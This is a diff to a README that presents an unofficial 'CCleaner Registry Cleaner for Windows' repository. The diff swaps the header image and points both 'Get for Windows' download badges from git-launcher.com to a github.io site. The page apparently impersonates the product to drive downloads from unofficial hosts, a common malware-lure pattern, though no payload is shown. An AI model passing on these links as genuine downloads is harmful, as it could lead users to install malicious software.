@@ -1,13 +1,13 @@
 # CCleaner Registry Cleaner for Windows
 
 <div align="center">
-<img src="https://media.cybernews.com/images/featured/2023/01/Ccleaner.jpg" alt="CCleaner Registry Cleaner Windows" width="900">
+<img src="https://upload.wikimedia.org/wikipedia/en/4/4a/CCleaner_logo_2013.png" alt="CCleaner Registry Cleaner Windows" width="900">
 </div>
 <br>
 
 <div align="center">
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://git-launcher.com/)
+[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](http://ccleaner-registrycleaner.github.io/)
 </div>
 
 ---
@@ -32,7 +32,7 @@ This environment supports CCleaner Windows on desktop PCs and laptops, allowing 
 
 <div align="center">
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://git-launcher.com/)
+[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](http://ccleaner-registrycleaner.github.io/)
 </div>
 
 ---
